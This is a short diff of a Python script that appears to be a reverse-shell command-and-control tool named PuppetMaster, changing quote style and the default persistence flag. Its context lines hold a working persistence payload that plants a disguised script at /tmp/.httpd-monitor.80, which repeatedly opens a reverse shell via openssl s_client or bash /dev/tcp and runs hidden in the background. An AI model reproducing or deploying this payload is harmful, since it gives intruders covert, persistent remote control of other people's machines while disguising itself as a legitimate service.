@@ -27,7 +27,7 @@ print('''\033[1;37m
                                                                 
 \033[0m''')
 
-reverse_host     = '127.0.0.1'
+reverse_host     = "127.0.0.1"
 reverse_tcp_port = "47080"
 reverse_ssl_port = "47443"
 MultiMaster_port = "47470"
@@ -38,7 +38,7 @@ class PuppetMaster:
         self.sessions = list()
         self.handlers = list()
         self.quiet              = False
-        self.Persistence        = True
+        self.Persistence        = False
         self.current_session    = None
         self.DuplicateSession   = False
         self.PersistenceCommand = f'(ps -ef|grep /tmp/.httpd-monitor.80|grep -v grep) || (echo "while true;do sleep 474;(mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-)||(bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1); done;">/tmp/.httpd-monitor.80 && chmod +x /tmp/.httpd-monitor.80 && (nohup bash /tmp/.httpd-monitor.80 >/dev/null 2>&1 &))'
